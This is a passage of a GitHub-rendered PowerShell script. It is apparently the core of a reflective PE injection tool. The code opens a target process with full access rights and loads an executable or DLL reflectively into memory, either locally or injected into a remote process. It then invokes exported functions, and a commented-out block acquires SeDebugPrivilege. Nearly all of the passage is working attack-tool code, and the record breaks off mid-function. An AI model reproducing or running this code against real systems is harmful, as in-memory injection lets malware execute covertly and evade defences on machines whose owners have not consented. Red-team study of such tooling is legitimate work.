          <td id="LC2762" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn&#39;t needed. Keeping it around just incase it is needed in the future.</span></td>
        </tr>
        <tr>
          <td id="L2763" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2763"></td>
          <td id="LC2763" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>If the script isn&#39;t running in the same Windows logon session as the target, get SeDebugPrivilege</span></td>
        </tr>
        <tr>
          <td id="L2764" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2764"></td>
          <td id="LC2764" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)</span></td>
        </tr>
        <tr>
          <td id="L2765" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2765"></td>
          <td id="LC2765" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>		{</span></td>
        </tr>
        <tr>
          <td id="L2766" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2766"></td>
          <td id="LC2766" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>			Write-Verbose &quot;Getting SeDebugPrivilege&quot;</span></td>
        </tr>
        <tr>
          <td id="L2767" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2767"></td>
          <td id="LC2767" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2768" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2768"></td>
          <td id="LC2768" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>		}	</span></td>
        </tr>
        <tr>
          <td id="L2769" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2769"></td>
          <td id="LC2769" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2770" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2770"></td>
          <td id="LC2770" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$ProcId</span> <span class="pl-k">-ne</span> <span class="pl-c1">$null</span>) <span class="pl-k">-and</span> (<span class="pl-smi">$ProcId</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>))</td>
        </tr>
        <tr>
          <td id="L2771" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2771"></td>
          <td id="LC2771" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2772" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2772"></td>
          <td id="LC2772" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.OpenProcess.Invoke</span></span>(<span class="pl-c1">0x001F0FFF</span><span class="pl-k">,</span> <span class="pl-c1">$false</span><span class="pl-k">,</span> <span class="pl-smi">$ProcId</span>)</td>
        </tr>
        <tr>
          <td id="L2773" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2773"></td>
          <td id="LC2773" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2774" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2774"></td>
          <td id="LC2774" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2775" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2775"></td>
          <td id="LC2775" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Couldn&#39;t obtain the handle for process ID: <span class="pl-smi">$ProcId</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2776" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2776"></td>
          <td id="LC2776" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2777" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2777"></td>
          <td id="LC2777" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2778" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2778"></td>
          <td id="LC2778" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Got the handle for the remote process to inject in to<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2779" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2779"></td>
          <td id="LC2779" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2780" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2780"></td>
          <td id="LC2780" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2781" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2781"></td>
          <td id="LC2781" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2782" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2782"></td>
          <td id="LC2782" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Load the PE reflectively</span></td>
        </tr>
        <tr>
          <td id="L2783" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2783"></td>
          <td id="LC2783" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Calling Invoke-MemoryLoadLibrary<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2784" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2784"></td>
          <td id="LC2784" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L2785" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2785"></td>
          <td id="LC2785" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2786" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2786"></td>
          <td id="LC2786" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2787" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2787"></td>
          <td id="LC2787" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PELoadedInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Invoke-MemoryLoadLibrary</span> <span class="pl-k">-</span>PEBytes <span class="pl-smi">$PEBytes</span> <span class="pl-k">-</span>ExeArgs <span class="pl-smi">$ExeArgs</span> <span class="pl-k">-</span>ForceASLR <span class="pl-smi">$ForceASLR</span></td>
        </tr>
        <tr>
          <td id="L2788" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2788"></td>
          <td id="LC2788" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2789" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2789"></td>
          <td id="LC2789" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2790" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2790"></td>
          <td id="LC2790" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2791" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2791"></td>
          <td id="LC2791" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PELoadedInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Invoke-MemoryLoadLibrary</span> <span class="pl-k">-</span>PEBytes <span class="pl-smi">$PEBytes</span> <span class="pl-k">-</span>ExeArgs <span class="pl-smi">$ExeArgs</span> <span class="pl-k">-</span>RemoteProcHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>ForceASLR <span class="pl-smi">$ForceASLR</span></td>
        </tr>
        <tr>
          <td id="L2792" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2792"></td>
          <td id="LC2792" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2793" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2793"></td>
          <td id="LC2793" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PELoadedInfo</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2794" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2794"></td>
          <td id="LC2794" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2795" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2795"></td>
          <td id="LC2795" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to load PE, handle returned is NULL<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2796" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2796"></td>
          <td id="LC2796" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2797" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2797"></td>
          <td id="LC2797" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2798" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2798"></td>
          <td id="LC2798" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$PELoadedInfo</span>[<span class="pl-c1">0</span>]</td>
        </tr>
        <tr>
          <td id="L2799" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2799"></td>
          <td id="LC2799" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemotePEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$PELoadedInfo</span>[<span class="pl-c1">1</span>] <span class="pl-c"><span class="pl-c">#</span>only matters if you loaded in to a remote process</span></td>
        </tr>
        <tr>
          <td id="L2800" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2800"></td>
          <td id="LC2800" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2801" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2801"></td>
          <td id="LC2801" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2802" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2802"></td>
          <td id="LC2802" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.</span></td>
        </tr>
        <tr>
          <td id="L2803" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2803"></td>
          <td id="LC2803" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">=</span> <span class="pl-c1">Get-PEDetailedInfo</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>Win32Types <span class="pl-smi">$Win32Types</span> <span class="pl-k">-</span>Win32Constants <span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2804" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2804"></td>
          <td id="LC2804" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$PEInfo<span class="pl-smi">.FileType</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>DLL<span class="pl-pds">&quot;</span></span>) <span class="pl-k">-and</span> (<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero))</td>
        </tr>
        <tr>
          <td id="L2805" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2805"></td>
          <td id="LC2805" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2806" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2806"></td>
          <td id="LC2806" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>########################################</span></td>
        </tr>
        <tr>
          <td id="L2807" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2807"></td>
          <td id="LC2807" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>## YOUR CODE GOES HERE</span></td>
        </tr>
        <tr>
          <td id="L2808" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2808"></td>
          <td id="LC2808" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>########################################</span></td>
        </tr>
        <tr>
          <td id="L2809" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2809"></td>
          <td id="LC2809" class="blob-code blob-code-inner js-file-line">	        <span class="pl-k">switch</span> (<span class="pl-smi">$FuncReturnType</span>)</td>
        </tr>
        <tr>
          <td id="L2810" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2810"></td>
          <td id="LC2810" class="blob-code blob-code-inner js-file-line">	        {</td>
        </tr>
        <tr>
          <td id="L2811" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2811"></td>
          <td id="LC2811" class="blob-code blob-code-inner js-file-line">	            <span class="pl-s"><span class="pl-pds">&#39;</span>WString<span class="pl-pds">&#39;</span></span> {</td>
        </tr>
        <tr>
          <td id="L2812" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2812"></td>
          <td id="LC2812" class="blob-code blob-code-inner js-file-line">	                <span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Calling function with WString return type<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2813" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2813"></td>
          <td id="LC2813" class="blob-code blob-code-inner js-file-line">				    [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$WStringFuncAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-MemoryProcAddress</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>FunctionName <span class="pl-s"><span class="pl-pds">&quot;</span>WStringFunc<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2814" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2814"></td>
          <td id="LC2814" class="blob-code blob-code-inner js-file-line">				    <span class="pl-k">if</span> (<span class="pl-smi">$WStringFuncAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2815" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2815"></td>
          <td id="LC2815" class="blob-code blob-code-inner js-file-line">				    {</td>
        </tr>
        <tr>
          <td id="L2816" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2816"></td>
          <td id="LC2816" class="blob-code blob-code-inner js-file-line">					    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Couldn&#39;t find function address.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2817" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2817"></td>
          <td id="LC2817" class="blob-code blob-code-inner js-file-line">				    }</td>
        </tr>
        <tr>
          <td id="L2818" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2818"></td>
          <td id="LC2818" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$WStringFuncDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>() ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L2819" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2819"></td>
          <td id="LC2819" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$WStringFunc</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$WStringFuncAddr</span><span class="pl-k">,</span> <span class="pl-smi">$WStringFuncDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L2820" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2820"></td>
          <td id="LC2820" class="blob-code blob-code-inner js-file-line">				    [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OutputPtr</span> <span class="pl-k">=</span> <span class="pl-smi">$WStringFunc<span class="pl-smi">.Invoke</span></span>()</td>
        </tr>
        <tr>
          <td id="L2821" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2821"></td>
          <td id="LC2821" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$Output</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringUni(<span class="pl-smi">$OutputPtr</span>)</td>
        </tr>
        <tr>
          <td id="L2822" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2822"></td>
          <td id="LC2822" class="blob-code blob-code-inner js-file-line">				    <span class="pl-c1">Write-Output</span> <span class="pl-smi">$Output</span></td>
        </tr>
        <tr>
          <td id="L2823" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2823"></td>
          <td id="LC2823" class="blob-code blob-code-inner js-file-line">	            }</td>
        </tr>
        <tr>
          <td id="L2824" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2824"></td>
          <td id="LC2824" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2825" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2825"></td>
          <td id="LC2825" class="blob-code blob-code-inner js-file-line">	            <span class="pl-s"><span class="pl-pds">&#39;</span>String<span class="pl-pds">&#39;</span></span> {</td>
        </tr>
        <tr>
          <td id="L2826" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2826"></td>
          <td id="LC2826" class="blob-code blob-code-inner js-file-line">	                <span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Calling function with String return type<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2827" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2827"></td>
          <td id="LC2827" class="blob-code blob-code-inner js-file-line">				    [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$StringFuncAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-MemoryProcAddress</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>FunctionName <span class="pl-s"><span class="pl-pds">&quot;</span>StringFunc<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2828" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2828"></td>
          <td id="LC2828" class="blob-code blob-code-inner js-file-line">				    <span class="pl-k">if</span> (<span class="pl-smi">$StringFuncAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2829" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2829"></td>
          <td id="LC2829" class="blob-code blob-code-inner js-file-line">				    {</td>
        </tr>
        <tr>
          <td id="L2830" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2830"></td>
          <td id="LC2830" class="blob-code blob-code-inner js-file-line">					    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Couldn&#39;t find function address.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2831" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2831"></td>
          <td id="LC2831" class="blob-code blob-code-inner js-file-line">				    }</td>
        </tr>
        <tr>
          <td id="L2832" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2832"></td>
          <td id="LC2832" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$StringFuncDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>() ([<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L2833" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2833"></td>
          <td id="LC2833" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$StringFunc</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$StringFuncAddr</span><span class="pl-k">,</span> <span class="pl-smi">$StringFuncDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L2834" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2834"></td>
          <td id="LC2834" class="blob-code blob-code-inner js-file-line">				    [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OutputPtr</span> <span class="pl-k">=</span> <span class="pl-smi">$StringFunc<span class="pl-smi">.Invoke</span></span>()</td>
        </tr>
        <tr>
          <td id="L2835" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2835"></td>
          <td id="LC2835" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$Output</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi(<span class="pl-smi">$OutputPtr</span>)</td>
        </tr>
        <tr>
          <td id="L2836" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2836"></td>
          <td id="LC2836" class="blob-code blob-code-inner js-file-line">				    <span class="pl-c1">Write-Output</span> <span class="pl-smi">$Output</span></td>
        </tr>
        <tr>
          <td id="L2837" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2837"></td>
          <td id="LC2837" class="blob-code blob-code-inner js-file-line">	            }</td>
        </tr>
        <tr>
          <td id="L2838" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2838"></td>
          <td id="LC2838" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2839" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2839"></td>
          <td id="LC2839" class="blob-code blob-code-inner js-file-line">	            <span class="pl-s"><span class="pl-pds">&#39;</span>Void<span class="pl-pds">&#39;</span></span> {</td>
        </tr>
        <tr>
          <td id="L2840" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2840"></td>
          <td id="LC2840" class="blob-code blob-code-inner js-file-line">	                <span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Calling function with Void return type<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2841" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2841"></td>
          <td id="LC2841" class="blob-code blob-code-inner js-file-line">				    [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Get-MemoryProcAddress</span> <span class="pl-k">-</span>PEHandle <span class="pl-smi">$PEHandle</span> <span class="pl-k">-</span>FunctionName <span class="pl-s"><span class="pl-pds">&quot;</span>VoidFunc<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2842" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2842"></td>
          <td id="LC2842" class="blob-code blob-code-inner js-file-line">				    <span class="pl-k">if</span> (<span class="pl-smi">$VoidFuncAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2843" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2843"></td>
          <td id="LC2843" class="blob-code blob-code-inner js-file-line">				    {</td>
        </tr>
        <tr>
          <td id="L2844" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2844"></td>
          <td id="LC2844" class="blob-code blob-code-inner js-file-line">					    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Couldn&#39;t find function address.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2845" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2845"></td>
          <td id="LC2845" class="blob-code blob-code-inner js-file-line">				    }</td>
        </tr>
        <tr>
          <td id="L2846" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2846"></td>
          <td id="LC2846" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$VoidFuncDelegate</span> <span class="pl-k">=</span> <span class="pl-c1">Get-DelegateType</span> <span class="pl-k">@</span>() ([<span class="pl-k">Void</span>])</td>
        </tr>
        <tr>
          <td id="L2847" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2847"></td>
          <td id="LC2847" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$VoidFunc</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="pl-smi">$VoidFuncAddr</span><span class="pl-k">,</span> <span class="pl-smi">$VoidFuncDelegate</span>)</td>
        </tr>
        <tr>
          <td id="L2848" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2848"></td>
          <td id="LC2848" class="blob-code blob-code-inner js-file-line">				    <span class="pl-smi">$VoidFunc<span class="pl-smi">.Invoke</span></span>() <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2849" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2849"></td>
          <td id="LC2849" class="blob-code blob-code-inner js-file-line">	            }</td>
        </tr>
        <tr>
          <td id="L2850" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2850"></td>
          <td id="LC2850" class="blob-code blob-code-inner js-file-line">	        }</td>
        </tr>
        <tr>
          <td id="L2851" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2851"></td>
          <td id="LC2851" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>########################################</span></td>
        </tr>
        <tr>
          <td id="L2852" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2852"></td>
          <td id="LC2852" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>## END OF YOUR CODE</span></td>
        </tr>
        <tr>
          <td id="L2853" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2853"></td>
          <td id="LC2853" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>########################################</span></td>
        </tr>
        <tr>
          <td id="L2854" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2854"></td>
          <td id="LC2854" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2855" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2855"></td>
          <td id="LC2855" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>For remote DLL injection, call a void function which takes no parameters</span></td>
        </tr>
        <tr>
          <td id="L2856" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2856"></td>
          <td id="LC2856" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">elseif</span> ((<span class="pl-smi">$PEInfo<span class="pl-smi">.FileType</span></span> <span class="pl-k">-ieq</span> <span class="pl-s"><span class="pl-pds">&quot;</span>DLL<span class="pl-pds">&quot;</span></span>) <span class="pl-k">-and</span> (<span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-ne</span> [<span class="pl-k">IntPtr</span>]::Zero))</td>
        </tr>
        <tr>
          <td id="L2857" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2857"></td>
          <td id="LC2857" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2858" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2858"></td>
